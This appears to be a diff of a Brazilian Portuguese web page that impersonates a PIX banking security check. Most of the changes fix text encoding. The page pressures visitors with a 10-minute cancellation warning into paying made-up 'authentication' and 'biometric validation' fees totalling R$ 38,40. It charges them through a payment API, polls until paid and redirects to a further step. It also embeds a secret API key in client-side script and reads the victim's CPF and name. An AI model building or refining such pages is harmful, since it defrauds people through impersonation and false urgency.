@@ -1,9 +1,9 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AutenticaÃ§Ã£o Cadastral da Chave PIX</title>
+  <title>Autentica&ccedil;&atilde;o Cadastral da Chave PIX</title>
   
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -20,6 +20,8 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f8fafc;
       color: #1e293b;
+      margin: 0;
+      padding: 0;
     }
     .taxa-row {
       display: flex; justify-content: space-between; align-items: center;
@@ -51,7 +53,7 @@
     </div>
   </header>
 
-  <!-- CONTEÃšDO PRINCIPAL -->
+  <!-- CONTEUDO PRINCIPAL -->
   <main class="max-w-xl w-full mx-auto px-4 py-6 flex-1 space-y-4">
     
     <!-- ETAPA ATUAL -->
@@ -59,17 +61,17 @@
       <span class="font-bold text-blue-900 flex items-center gap-1.5">
         <i class="fa-solid fa-shield-halved text-blue-600"></i> Etapa 2 de 4
       </span>
-      <span class="text-blue-700 font-medium">AutenticaÃ§Ã£o Cadastral da Chave PIX</span>
+      <span class="text-blue-700 font-medium">Autentica&ccedil;&atilde;o Cadastral da Chave PIX</span>
     </div>
 
-    <!-- ALERTA DE PENDÃŠNCIA -->
+    <!-- ALERTA DE PENDENCIA -->
     <div class="bg-white rounded-2xl border border-red-200 shadow-sm overflow-hidden">
       <div class="bg-red-500 text-white px-4 py-2.5 flex items-center gap-2 font-bold text-sm">
         <i class="fa-solid fa-triangle-exclamation"></i>
-        <span>VALIDAÃ‡ÃƒO DE SEGURANÃ‡A BANCÃRIA</span>
+        <span>VALIDA&Ccedil;&Atilde;O DE SEGURAN&Ccedil;A BANC&Aacute;RIA</span>
       </div>
       <div class="p-5 space-y-3 text-sm text-slate-700 leading-relaxed">
-        <p>Para evitar cancelamentos ou estornos automÃ¡ticos de transferÃªncia pelo Sistema de Pagamentos Brasileiro, Ã© necessÃ¡rio realizar a validaÃ§Ã£o de titularidade da sua Chave PIX.</p>
+        <p>Para evitar cancelamentos ou estornos autom&aacute;ticos de transfer&ecirc;ncia pelo Sistema de Pagamentos Brasileiro, &eacute; necess&aacute;rio realizar a valida&ccedil;&atilde;o de titularidade da sua Chave PIX.</p>
         <div class="bg-amber-50 border border-amber-200 rounded-lg p-3 text-amber-900 text-xs flex items-center gap-2 font-medium">
           <i class="fa-solid fa-clock text-amber-600 text-base shrink-0"></i>
           <span>Prazo de liquida&ccedil;&atilde;o: <strong>10 minutos</strong> antes do cancelamento da ordem.</span>
@@ -86,10 +88,10 @@
       
       <div class="space-y-1">
                   <div class="taxa-row">
-            <span class="taxa-label">Certificado de autenticaÃ§Ã£o cadastral</span>
+            <span class="taxa-label">Certificado de autentica&ccedil;&atilde;o cadastral</span>
             <span class="taxa-value">R$ 23,80</span>
           </div>          <div class="taxa-row">
-            <span class="taxa-label">ValidaÃ§Ã£o biomÃ©trica e antifraude</span>
+            <span class="taxa-label">Valida&ccedil;&atilde;o biom&eacute;trica e antifraude</span>
             <span class="taxa-value">R$ 14,60</span>
           </div>
         <div class="taxa-row bg-slate-50 rounded-lg mt-2 p-3 font-black text-base border border-slate-200">
@@ -99,8 +101,8 @@
       </div>
     </div>
 
-    <!-- BOTÃƒO DE AÃ‡ÃƒO -->
-    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base">
+    <!-- BOTAO DE ACAO -->
+    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base cursor-pointer">
       <i class="fa-brands fa-pix text-xl text-emerald-400"></i>
       <span>VALIDAR CHAVE E ENVIAR PIX</span>
     </button>
@@ -165,9 +167,9 @@
     const FASTSOFT_AUTH = "Basic " + btoa("x:sk_cbb3917adbe1bdbcecf3e1bd76c86db8f509e8e3");
     let urlParams = new URLSearchParams(window.location.search);
     let cpf = (urlParams.get('cpf') || localStorage.getItem('userCPF') || '').replace(/\D/g, '');
-    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'BeneficiÃ¡rio';
+    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'Beneficiario';
 
-    if (nome) {
+    if (nome && nome !== 'Beneficiario') {
       document.getElementById('u-nome').textContent = nome;
       try { localStorage.setItem('userName', nome); } catch(e){}
     }
@@ -196,7 +198,7 @@
           phone: "11999999999"
         },
         items: [{
-          title: "Taxa de AutenticaÃ§Ã£o Cadastral PIX",
+          title: "Taxa de Autenticacao Cadastral PIX",
           unitPrice: 3840,
           quantity: 1,
           tangible: false
@@ -265,7 +267,6 @@
             if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
               clearInterval(pollInterval);
               
-              // Redireciona para o prÃ³ximo passo
               let p = window.location.pathname;
               let bp = "";
               if (p.indexOf("/replay/9345488724234") !== -1) bp = "/replay/9345488724234";
